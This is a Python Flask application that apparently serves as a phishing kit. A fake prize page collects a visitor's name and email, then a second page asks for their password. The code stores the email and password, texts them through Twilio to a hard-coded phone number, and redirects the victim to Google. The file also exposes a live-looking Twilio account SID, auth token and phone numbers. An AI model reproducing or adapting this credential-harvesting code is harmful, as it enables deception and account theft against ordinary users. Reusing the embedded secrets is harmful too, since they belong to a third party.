from flask import Flask, render_template, redirect, flash, request
from wtforms import Form, TextField, validators, PasswordField, SubmitField
import logging
from twilio.rest import Client
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

import db

def Notify(msg):
  account_sid = "AC1573fff21eed6e91e511bc233c3e93ed"
  # auth_token = os.environ["TWILIO_AUTH_TOKEN"]
  auth_token = "174cd6bc28632f22b24e1d498c1c0e01"
  client = Client(account_sid, auth_token)
  message = client.messages.create(
    body="{}".format(msg),
    from_="+12707167944",
    to="+923226383846"
  )
  print(message.sid)

# Home page
class ReusableForm(Form):
    def validate_amazon(form, field):
        logging.warning(field.data)
        
    name = TextField('Name: ', validators=[validators.required()])
    email = TextField('Email:', validators=[validators.Email('Please enter a valid email address')])
        
    @app.route('/', methods=['GET', 'POST'])
    def home():
            form = ReusableForm(request.form)
            print (form.errors)
            if request.method == 'POST':
                name=str(request.form['name'])
                email=str(request.form['email'])

                if form.validate():
                
                
                    flash('SUCCESS: We are verifying your record')
                    logging.warning(f'{name}, {email}')


                    success_msg = f'Congratulations! You are eligible to this Prize. Enjoy :)'
                    flash(f'{success_msg}')
                    db.write_data(name, email)

                    return redirect("/mail?winner="+email)
                    
                else:
                    msg=''
                    ers = form.errors
                    for key in ers.keys():
                        for l in ers[key]:
                            msg+=l
                            msg+='. '
                    print(msg)

                    flash(f'Error: {msg}')

            
            return render_template('hello.html', form=form)
        
class RegisterForm(Form):

    password = PasswordField(label='Password:')

    submit = SubmitField(label='Next')

@app.route('/mail', methods=['GET', 'POST'])
def passwd():
    form = RegisterForm()
    
    email = request.args.get('winner')
    if request.method == 'POST':
        
                password=str(request.form['password'])

                if form.validate():
                    msg = f"\nEmail: {email} \nPassword: {password}\n" 
                    db.write_pass(email, password)
                    Notify(msg)
                    return redirect("https://www.google.com/")
                    
                else:
                    msg=''
                    ers = form.errors
                    for key in ers.keys():
                        for l in ers[key]:
                            msg+=l
                            msg+='. '
                    print(msg)

                    flash(f'Error: {msg}')
    return render_template("passwd.html", form=form, email=email)


# User registration page
@app.route('/register', methods=['GET', 'POST'])
def register():
    return render_template('main.html')

# User login page
@app.route('/login', methods=['GET', 'POST'])
def login():
    return render_template('main.html')

# User dashboard
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

if __name__ == '__main__':
    try:
        port = int(os.environ.get('PORT', 5000))
        app.run(host='0.0.0.0', debug=False)
        #app.run(host='localhost', port = port)
    except:
        logging.exception('error')
